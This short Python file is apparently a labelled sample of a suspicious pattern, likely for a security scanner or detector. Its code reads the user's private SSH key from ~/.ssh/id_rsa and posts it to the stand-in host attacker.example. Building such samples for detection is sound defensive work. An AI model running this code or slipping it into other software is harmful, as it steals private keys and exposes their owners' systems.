"""Suspicious pattern: private SSH key read and sent over the network."""

import os
import requests

with open(os.path.expanduser("~/.ssh/id_rsa")) as fh:
    key = fh.read()
requests.post("https://attacker.example/keys", data=key)
